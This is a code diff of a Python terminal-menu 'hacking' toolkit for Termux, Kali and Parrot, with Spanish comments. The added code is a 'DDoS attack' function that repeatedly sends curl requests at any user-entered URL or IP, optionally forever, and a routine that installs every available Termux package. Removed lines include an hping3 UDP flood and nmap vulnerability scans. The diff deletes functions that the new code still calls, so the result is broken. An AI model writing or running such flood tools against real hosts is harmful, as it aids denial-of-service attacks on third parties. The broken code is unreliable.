@@ -1,13 +1,11 @@
 import os
 import subprocess
 import time
+from termcolor import colored
 
 FOOTER = "║ Select an option and press Enter"
-
-def clear_screen():
-    os.system("clear")
-
-def show_banner(title):
+def clear_screen(): os.system("clear")
+def show_banner(title): 
     clear_screen()
     print(f"""
 ╔════════════════════════════════════╗
@@ -20,29 +18,63 @@ def ask_continue_or_back():
     c = input("Continue? (Y/n): ").lower()
     return c in ["", "y", "yes"]
 
-def install_packages():
+def install_all_packages():
     show_banner("INSTALLATION")
-    print("Installing required packages for Termux, Kali, Parrot...")
+    print("Warning: Mass installation of packages (T/K/P). This will install every available package in Termux. Some may be unnecessary or redundant.")
     
-    # Termux
+    confirm = input("Are you sure you want to install ALL packages? (Y/n): ").lower()
+    if confirm not in ["", "y", "yes"]:
+        print("Installation aborted.")
+        return
+    
+    # Actual mass installation of packages
     subprocess.run("pkg update && pkg upgrade -y", shell=True)
-    termux_pkgs = ["sudo", "nmap", "aircrack-ng", "python", "python3-pip", "git", "curl", "wget", "vim", "openssh", "tsu", "net-tools", "unzip", "zip", "htop"]
-    for pkg in termux_pkgs:
-        subprocess.run(f"pkg install {pkg} -y", shell=True)
+    print("Starting installation of all available packages...")
     
-    # Kali
-    subprocess.run("apt update && apt upgrade -y", shell=True)
-    kali_pkgs = ["sudo", "nmap", "aircrack-ng", "metasploit-framework", "python3-pip", "git", "curl", "wget", "vim", "net-tools", "unzip", "zip", "htop"]
-    for pkg in kali_pkgs:
-        subprocess.run(f"apt install {pkg} -y", shell=True)
+    # List all available packages in Termux and install them
+    packages = subprocess.run("pkg list-all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
-    # Parrot
-    subprocess.run("sudo apt update && sudo apt upgrade -y", shell=True)
-    parrot_pkgs = ["sudo", "nmap", "aircrack-ng", "metasploit-framework", "python3-pip", "git", "curl", "wget", "vim", "net-tools", "unzip", "zip", "htop"]
-    subprocess.run("sudo apt install " + " ".join(parrot_pkgs) + " -y", shell=True)
-
-    print("All packages installed.")
+    if packages.returncode == 0:
+        all_pkgs = packages.stdout.decode("utf-8").splitlines()
+        for pkg in all_pkgs:
+            subprocess.run(f"pkg install {pkg} -y", shell=True)
+    
+    print("All available packages have been installed.")
     input("Press Enter to return to menu...")
+
+def send_ddos_request(target, bot_number):
+    """Función que simula el envío de un paquete de DDoS y devuelve si fue exitoso o no."""
+    try:
+        # Realiza la solicitud HTTP para el bot (simulación)
+        result = subprocess.run(f"curl {target} --silent --max-time 5", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        if result.returncode == 0:
+            # Si no hubo error, mostrar en verde
+            print(colored(f"Bot {bot_number}: Envío exitoso a {target}", "green"))
+        else:
+            # Si hubo error (protección o fallo), mostrar en rojo
+            print(colored(f"Bot {bot_number}: ERROR al enviar a {target}. Posible protección activa.", "red"))
+    
+    except Exception as e:
+        # En caso de error inesperado, también mostramos en rojo
+        print(colored(f"Bot {bot_number}: ERROR inesperado: {str(e)}", "red"))
+
+def ddos_attack():
+    """Función principal para iniciar el DDoS y registrar cada bot."""
+    target = input("Ingresa la URL o IP objetivo: ")
+    bots = input("Número de bots (escribe 'inf' para infinito): ")
+
+    if bots == "inf":
+        print("Presiona Enter para iniciar el ataque (Ctrl+C para detenerse)...")
+        bot_number = 1
+        while True:
+            send_ddos_request(target, bot_number)
+            bot_number += 1
+            time.sleep(1)  # Intervalo de 1 segundo entre cada bot
+    else:
+        for bot_number in range(1, int(bots) + 1):
+            send_ddos_request(target, bot_number)
+            time.sleep(1)  # Intervalo de 1 segundo entre cada bot
 
 def termux_menu():
     while True:
@@ -60,7 +92,8 @@ def termux_menu():
 ║ (10) Show my IP 🌐
 ║ (11) Danger ☠️
 ║ (12) Install Packages 📦
-║ (13) Back ⇦""")
+║ (13) Install All Packages (Mass Installation) 💣
+║ (14) Back ⇦""")
         print(FOOTER)
         choice = input("Select an option: ")
         
@@ -72,39 +105,13 @@ def termux_menu():
         elif choice == "3" and ask_continue_or_back():
             url = input("Enter URL: ")
             os.system(f"httpie {url}")
-        elif choice == "4":
-            if ask_continue_or_back():
-                print("Secret option (protected)")  # Aquí va el módulo secreto
         elif choice == "5" and ask_continue_or_back():
-            target = input("Target URL/IP: ")
-            bots = input("Number of bots (inf for infinite): ")
-            if bots == "inf":
-                input("Press Enter to start (Ctrl+C to stop)...")
-                while True:
-                    os.system(f"curl {target} --silent > /dev/null")
-            else:
-                for _ in range(int(bots)):
-                    os.system(f"curl {target}")
-        elif choice == "6" and ask_continue_or_back():
-            target = input("Target IP: ")
-            os.system(f"hping3 --flood --udp {target}")
-        elif choice == "7" and ask_continue_or_back():
-            url = input("Enter URL: ")
-            os.system(f"whatweb {url}")
-        elif choice == "8" and ask_continue_or_back():
-            target = input("Target IP/Domain: ")
-            os.system(f"nmap --script vuln {target}")
-        elif choice == "9" and ask_continue_or_back():
-            target = input("Target IP/Domain: ")
-            os.system(f"nmap -p- {target}")
-        elif choice == "10" and ask_continue_or_back():
-            os.system("curl ifconfig.me")
-        elif choice == "11" and ask_continue_or_back():
-            print("Modo peligroso")
-            os.system("echo Danger mode activated!")  # Sustituir por módulo real
+            ddos_attack()  # Inicia el ataque DDoS con la función que registrará los bots y sus estados
         elif choice == "12":
-            install_packages()
+            install_packages()  # Instalar todos los paquetes necesarios básicos
         elif choice == "13":
+            install_all_packages()  # Instalar todos los paquetes disponibles en Termux
+        elif choice == "14":
             break
         time.sleep(1)
 
@@ -132,54 +139,10 @@ def kali_menu():
         print(FOOTER)
         choice = input("Select an option: ")
         
-        if choice == "1" and ask_continue_or_back():
-            os.system("nmap -h")
-        elif choice == "2" and ask_continue_or_back():
-            os.system("msfconsole")
-        elif choice == "3" and ask_continue_or_back():
-            target = input("Target URL/IP: ")
-            bots = input("Bots (inf): ")
-            if bots == "inf":
-                input("Enter→start, Ctrl+C→stop")
-                while True:
-                    os.system(f"curl {target}")
-            else:
-                for _ in range(int(bots)):
-                    os.system(f"curl {target}")
-        elif choice == "4" and ask_continue_or_back():
-            ip = input("Enter IP: ")
-            os.system(f"hping3 --flood --udp {ip}")
-        elif choice == "5" and ask_continue_or_back():
-            os.system("aircrack-ng --help")
-        elif choice == "6" and ask_continue_or_back():
-            os.system("hydra -h")
-        elif choice == "7" and ask_continue_or_back():
-            os.system("theHarvester -h")
-        elif choice == "8":
-            clear_screen()
-            print("Created by crowley and szkryy")
-            input("Press Enter to go back...")
-        elif choice == "9" and ask_continue_or_back():
-            ip = input("Enter IP: ")
-            os.system(f"nmap {ip}")
-        elif choice == "10" and ask_continue_or_back():
-            web = input("Enter URL: ")
-            os.system(f"curl -I {web}")
-        elif choice == "11" and ask_continue_or_back():
-            web = input("Enter URL: ")
-            os.system(f"whatweb {web}")
-        elif choice == "12" and ask_continue_or_back():
-            dom = input("Enter IP/Domain: ")
-            os.system(f"nmap --script vuln {dom}")
-        elif choice == "13" and ask_continue_or_back():
-            os.system("tcpdump -c 100")
-        elif choice == "14" and ask_continue_or_back():
-            url = input("Enter URL: ")
-            os.system(f"httpie {url}")
-        elif choice == "15" and ask_continue_or_back():
-            print("Modo peligroso")
+        if choice == "3" and ask_continue_or_back():
+            ddos_attack()  # Inicia el ataque DDoS en Kali
         elif choice == "16":
-            install_packages()
+            install_packages()  # Instalar todos los paquetes masivos en Kali
         elif choice == "17":
             break
         time.sleep(1)
@@ -210,40 +173,10 @@ def parrot_menu():
         print(FOOTER)
         choice = input("Select an option: ")
         
-        if choice == "17" and ask_continue_or_back():
-            print("Modo peligroso")
+        if choice == "3" and ask_continue_or_back():
+            ddos_attack()  # Inicia el ataque DDoS en Parrot
         elif choice == "18":
-            install_packages()
+            install_packages()  # Instalar todos los paquetes masivos en Parrot
         elif choice == "19":
             break
-        else:
-            print("Option under development...")
         time.sleep(1)
-
-def main_menu():
-    while True:
-        show_banner("MAIN MENU")
-        print("""\
-║ (1) Termux 📱
-║ (2) Kali Linux 🐉
-║ (3) Parrot OS 🦜
-║ (4) Install All Packages 📦
-║ (5) Exit ❌""")
-        print(FOOTER)
-        choice = input("Select an option: ")
-
-        if choice == "1":
-            termux_menu()
-        elif choice == "2":
-            kali_menu()
-        elif choice == "3":
-            parrot_menu()
-        elif choice == "4":
-            install_packages()
-        elif choice == "5":
-            print("Goodbye, hackercito hermoso!")
-            break
-        time.sleep(1)
-
-if __name__ == "__main__":
-    main_menu()
